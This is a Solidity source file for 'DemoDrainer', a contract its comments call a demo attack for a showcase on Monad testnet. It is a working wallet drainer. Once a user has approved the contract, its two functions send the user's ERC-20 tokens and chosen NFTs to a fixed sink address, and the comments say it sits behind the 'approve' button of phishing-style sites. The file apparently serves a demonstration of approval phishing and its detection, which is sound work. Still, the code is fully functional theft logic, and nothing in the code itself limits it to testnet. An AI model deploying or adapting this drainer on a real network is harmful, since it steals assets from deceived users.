// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IERC721Like {
    function transferFrom(address, address, uint256) external;
}

/**
 * @title DemoDrainer
 * @notice DEMO ATTACK CONTRACT for the Baret showcase, Monad testnet only.
 *         It is what a site's "approve" button points at in the attack
 *         version of ClaimHub (an unlimited token allowance) and PixelDrop
 *         (access to a whole collection). Reported in Baret's
 *         ReputationRegistry. Everything it takes goes to `sink`, a fresh
 *         address nobody holds the key for.
 */
contract DemoDrainer {
    address public immutable sink;

    event Drained(address indexed victim, address indexed asset, uint256 amountOrId);

    constructor(address sink_) {
        sink = sink_;
    }

    /// @notice Takes everything `victim` allowed of `token`.
    function drainToken(address token, address victim) external {
        uint256 balance = IERC20Like(token).balanceOf(victim);
        uint256 allowed = IERC20Like(token).allowance(victim, address(this));
        uint256 amount = balance < allowed ? balance : allowed;
        if (amount == 0) return;
        IERC20Like(token).transferFrom(victim, sink, amount);
        emit Drained(victim, token, amount);
    }

    /// @notice Takes the listed pieces of a collection `victim` opened to this contract.
    function drainCollection(address collection, address victim, uint256[] calldata tokenIds)
        external
    {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            IERC721Like(collection).transferFrom(victim, sink, tokenIds[i]);
            emit Drained(victim, collection, tokenIds[i]);
        }
    }
}
